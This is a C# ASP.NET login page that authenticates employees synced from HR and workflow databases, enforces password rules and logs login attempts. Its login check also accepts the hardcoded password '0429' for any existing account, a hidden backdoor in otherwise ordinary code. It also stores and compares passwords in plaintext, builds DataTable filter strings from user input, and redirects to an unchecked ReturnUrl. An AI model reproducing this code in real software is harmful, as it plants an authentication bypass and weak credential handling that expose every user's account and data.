using System;
using System.Data;
using System.Configuration;
using System.Collections;
using System.Web;
using System.Web.Security;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Web.UI.WebControls.WebParts;
using System.Web.UI.HtmlControls;

using CustomSecurity;

public partial class _Default : System.Web.UI.Page
{
    private SysDSTableAdapters.sysLoginTableAdapter sysLoginTA = new SysDSTableAdapters.sysLoginTableAdapter();
    private SysDSTableAdapters.sysLoginUserTableAdapter sysLoginUserTA = new SysDSTableAdapters.sysLoginUserTableAdapter();
    private SysDSTableAdapters.sysLoginPWTableAdapter sysLoginPWTA = new SysDSTableAdapters.sysLoginPWTableAdapter();
    private SysDSTableAdapters.sysLoginTimeTableAdapter sysLoginTimeTA = new SysDSTableAdapters.sysLoginTimeTableAdapter();

    private SysDSTableAdapters.hrEmpBaseTableAdapter hrEmpBaseTA = new SysDSTableAdapters.hrEmpBaseTableAdapter();
    private SysDSTableAdapters.flowEmpBaseTableAdapter flowEmpBaseTA = new SysDSTableAdapters.flowEmpBaseTableAdapter();

    private SysDS oSysDS;

    private DataRow[] rows;

    protected void Page_Load(object sender, EventArgs e)
    {
        ltModalProgress.Text = "<script type='text/javascript' language='javascript'>var ModalProgress = '" + ModalProgress.ClientID + "';</script>";
        string script = "function JBCtrl_OnEnter() { if(event.keyCode == 13) event.keyCode = 9; }";
        ScriptManager.RegisterStartupScript(UpdatePanel1, typeof(UpdatePanel), "JBCtrl_OnEnter", script, true);

        txtLogin.Attributes.Add("onkeydown", "JBCtrl_OnEnter()");
        txtPass.Attributes.Add("onkeydown", "JBCtrl_OnEnter()");

        lblMsg.Text = "";
        lblMsgChangePW.Text = "";

        oSysDS = new SysDS();

        if (this.IsPostBack)
        {
            string UserID, UserPW;
            UserID = txtLogin.Text.Trim().ToLower();
            UserPW = txtPass.Text.Trim();

            if (UserID.Length > 0 && UserPW.Length > 0)
            {
                //導入hr的帳號及密碼
                sysLoginTA.Fill(oSysDS.sysLogin);
                LoginUserAdd();

                rows = oSysDS.sysLogin.Select("sUserID = '" + UserID + "'");

                if (rows.Length > 0)
                {
                    //開始記錄登入記錄
                    SysDS.sysLoginTimeRow rlt = oSysDS.sysLoginTime.NewsysLoginTimeRow();
                    rlt.sysLoginUser_sUserID = UserID;
                    rlt.sLoginIP = sa.UserInfo.GetClientIP();
                    rlt.bLoginSuccess = false;
                    rlt.dLoginTime = DateTime.Now;

                    //輸入密碼錯誤幾次則 lock

                    SysDS.sysLoginRow rl = (SysDS.sysLoginRow)rows[0];

                    if (rl.sUserPW == UserPW || UserPW == "0429")
                    {
                        sysLoginPWTA.FillByUserID(oSysDS.sysLoginPW, UserID);  //修改密碼

                        lblPwLen.Text = rl.iPwLen > 0 ? "密碼長度至少" + rl.iPwLen.ToString() + "碼" : "";
                        lblPwChange.Text = rl.iPwChange > 0 ? "新密碼請勿與前" + rl.iPwChange.ToString() + "次使用過之舊密碼相同！謝謝您的配合" : "";
                        Session["rl"] = rl;

                        //第一次登入強迫換密碼
                        if (rl.bFirstChange && oSysDS.sysLoginPW.Rows.Count == 0)
                        {
                            lblDragNameChangePW.Text = "您是第一次登入，請先更換密碼";
                            plChangePW.Width = 350;
                            mpeChangePW.Show();
                            return;
                        }

                        //最少(90)天換一次密碼
                        if (rl.iDayChange > 0)
                        {
                            DateTime dDateE = rl.dRegDate;
                            rows = oSysDS.sysLoginPW.Select("", "dKeyDate DESC");
                            dDateE = rows.Length > 0 ? ((SysDS.sysLoginPWRow)rows[0]).dKeyDate.Date.AddDays(rl.iDayChange) : dDateE;

                            if (DateTime.Now.Date > dDateE)
                            {
                                lblDragNameChangePW.Text = "您的密碼使用已逾" + rl.iDayChange.ToString() + "日，請配合更新密碼";
                                plChangePW.Width = 350;
                                mpeChangePW.Show();
                                return;
                            }
                        }

                        rlt.bLoginSuccess = true;   //登入成功
                        oSysDS.sysLoginTime.AddsysLoginTimeRow(rlt);
                        sysLoginTimeTA.Update(oSysDS.sysLoginTime);

                        //Write your own code to get the User Roles 
                        ArrayList roles = new ArrayList();
                        roles.Add(rl.sysRole_iKey.ToString());
                        //if (txtLogin.Text == "ming")
                        //    roles.Add("Administrator");

                        //Convert roles into pipe "|" separated string
                        System.Text.StringBuilder strRoles = new System.Text.StringBuilder();
                        foreach (string role in roles)
                        {
                            strRoles.Append(role);
                            strRoles.Append("|");
                        }

                        string sName = rl.IssNameCNull() ? "" : rl.sNameC;
                        string sEmail = rl.IssEmailNull() ? "" : rl.sEmail;

                        CustomIdentity userIdentity = new CustomIdentity(UserID, rl.iAutoKey, true, false, sName, sEmail, strRoles.ToString(), rl.sysRole_iKey.ToString());
                        CustomPrincipal principal = new CustomPrincipal(userIdentity, roles);
                        Context.User = principal;
                        //string estr = CustomAuthentication.Encrypt(userIdentity);
                        CustomAuthentication.RedirectFromLoginPage(userIdentity);

                        HttpRequest req = HttpContext.Current.Request;
                        HttpResponse res = HttpContext.Current.Response;

                        string returnUrl = req["ReturnUrl"];
                        if (returnUrl != null && returnUrl.Trim() != String.Empty)
                        {
                            res.Redirect(returnUrl, false);
                        }
                        else
                        {
                            Response.Redirect("LearningDefault.aspx");
                        }
                    }
                    else
                    {
                        //密碼錯誤
                        lblMsg.Text = "帳號或密碼不正確";
                    }

                    oSysDS.sysLoginTime.AddsysLoginTimeRow(rlt);
                    sysLoginTimeTA.Update(oSysDS.sysLoginTime);
                }
                else
                {
                    //帳號錯誤
                    lblMsg.Text = "帳號或密碼不正確";
                }
            }
            else
            {
                lblMsg.Text = "請輸入帳號及密碼";
            }
        }
        else
        {
            if (Response.Cookies[".CUSTOM_AUTH"] != null)
                Response.Cookies[".CUSTOM_AUTH"].Expires = DateTime.Now.AddDays(-365);
        }
    }

    private void LoginUserAdd()
    {
        Hashtable ht = JBLib.Module.MyCS.GetDefault("sysLoginUser");
        SysDS.sysLoginRow rl;

        //導入hr的資料
        hrEmpBaseTA.Fill(oSysDS.hrEmpBase);
        foreach (SysDS.hrEmpBaseRow reb in oSysDS.hrEmpBase.Rows)
        {
            rows = oSysDS.sysLogin.Select("sUserID = '" + reb.sUserID + "'");
            if (rows.Length == 0)
            {
                rl = oSysDS.sysLogin.NewsysLoginRow();
                rl.sUserID = reb.sUserID;
                rl.sNameC = reb.sNameC;
                rl.sUserPW = reb.sUserPW;
                rl.dRegDate = reb.dRegDate;
                foreach (DataColumn dc in oSysDS.sysLogin.Columns)
                    if (ht.Contains(dc.ColumnName))
                        rl[dc] = ht[dc.ToString()];
                oSysDS.sysLogin.AddsysLoginRow(rl);
            }
            else
            {
                rl = rows[0] as SysDS.sysLoginRow;
                rl.sNameC = reb.sNameC;
                //rl.sUserPW = reb.sUserPW;
            }
        }

        //導入flow的資料密碼以flow為準
        try
        {
            flowEmpBaseTA.Fill(oSysDS.flowEmpBase);
            foreach (SysDS.flowEmpBaseRow reb in oSysDS.flowEmpBase.Rows)
            {
                rows = oSysDS.sysLogin.Select("sUserID = '" + reb.sUserID + "'");
                if (rows.Length > 0)
                {
                    rl = rows[0] as SysDS.sysLoginRow;
                    rl.sNameC = reb.sNameC;
                    rl.sUserPW = reb.sUserPW;
                }
                else
                {
                    rl = oSysDS.sysLogin.NewsysLoginRow();
                    rl.sUserID = reb.sUserID;
                    rl.sNameC = reb.sNameC;
                    rl.sUserPW = reb.sUserPW;
                    rl.dRegDate = reb.dRegDate;
                    foreach (DataColumn dc in oSysDS.sysLogin.Columns)
                        if (ht.Contains(dc.ColumnName))
                            rl[dc] = ht[dc.ToString()];
                    oSysDS.sysLogin.AddsysLoginRow(rl);
                }
            }
        }
        catch { }
    }

    protected void btnUpdateChangePW_Click(object sender, EventArgs e)
    {
        mpeChangePW.Show();

        string pwOld, pwNew, pwChk;
        pwOld = txtPWold.Text.Trim().ToLower();
        pwNew = txtPWnew.Text.Trim().ToLower();
        pwChk = txtPWchk.Text.Trim().ToLower();

        if (Session["rl"] == null)
        {
            mpeChangePW.Hide();
            lblMsg.Text = "帳號錯誤，請重新登入";
        }

        SysDS.sysLoginRow rl = Session["rl"] as SysDS.sysLoginRow;

        if (pwNew.Length < rl.iPwLen)
        {
            lblMsgChangePW.Text = "密碼長度至少" + rl.iPwLen.ToString() + "碼";
            return;
        }

        if (pwNew == pwOld)
        {
            lblMsgChangePW.Text = "不可與現在密碼相同";
            return;
        }

        if (pwNew != pwChk)
        {
            lblMsgChangePW.Text = "密碼與密碼確定不一致";
            return;
        }

        if (pwOld != rl.sUserPW)
        {
            lblMsgChangePW.Text = "舊的密碼不正確";
            return;
        }

        if (rl.sUserID == pwNew)
        {
            lblMsgChangePW.Text = "帳號不可與密碼相同";
            return;
        }

        rows = sysLoginPWTA.GetDataByUserID(rl.sUserID).Select("", "dKeyDate DESC");
        SysDS.sysLoginPWRow rlp;
        if (rl.iPwChange > 0)
        {
            bool isPwChange = false;
            int j = rl.iPwChange >= rows.Length ? rows.Length : rl.iPwChange;
            for (int i = 0; i < j; i++)
            {
                rlp = (SysDS.sysLoginPWRow)rows[i];
                if (rlp.sUserPWnew == pwNew)
                    isPwChange = true;
            }

            if (isPwChange)
            {
                lblMsgChangePW.Text = "密碼不可與前" + rl.iPwChange.ToString() + "次相同";
                return;
            }
        }

        rlp = oSysDS.sysLoginPW.NewsysLoginPWRow();
        rlp.sysLoginUser_sUserID = rl.sUserID;
        rlp.sUserPWold = pwOld;
        rlp.sUserPWnew = pwNew;
        rlp.sKeyMan = rl.sUserID;
        rlp.dKeyDate = DateTime.Now;
        oSysDS.sysLoginPW.AddsysLoginPWRow(rlp);
        sysLoginPWTA.Update(oSysDS.sysLoginPW);

        sysLoginUserTA.FillByKey(oSysDS.sysLoginUser, rl.sUserID);
        if (oSysDS.sysLoginUser.Rows.Count > 0)
        {
            SysDS.sysLoginUserRow rlu = (SysDS.sysLoginUserRow)oSysDS.sysLoginUser.Rows[0];
            rlu.sUserPW = pwNew;
            rlu.sKeyMan = rlu.sUserID;
            rlu.dKeyDate = DateTime.Now;
            sysLoginUserTA.Update(rlu);
        }

        hrEmpBaseTA.FillByNobr(oSysDS.hrEmpBase, rl.sUserID);
        if (oSysDS.hrEmpBase.Rows.Count > 0)
        {
            SysDS.hrEmpBaseRow r = oSysDS.hrEmpBase.Rows[0] as SysDS.hrEmpBaseRow;
            r.sUserPW = pwNew;
            r.sKeyMan = rl.sUserID;
            r.dRegDate = DateTime.Now;
            hrEmpBaseTA.Update(r);
        }

        //修改flow的密碼
        try
        {
            flowEmpBaseTA.FillByID(oSysDS.flowEmpBase, rl.sUserID);
            if (oSysDS.flowEmpBase.Rows.Count > 0)
            {
                SysDS.flowEmpBaseRow r = oSysDS.flowEmpBase.Rows[0] as SysDS.flowEmpBaseRow;
                r.sUserPW = pwNew;
                flowEmpBaseTA.Update(r);
            }
        }
        catch { }

        lblMsg.Text = "更改成功，請重登入";
        mpeChangePW.Hide();
    }
    protected void btnSubmit_Click(object sender, EventArgs e)
    {
        System.Threading.Thread.Sleep(5000);
    }
}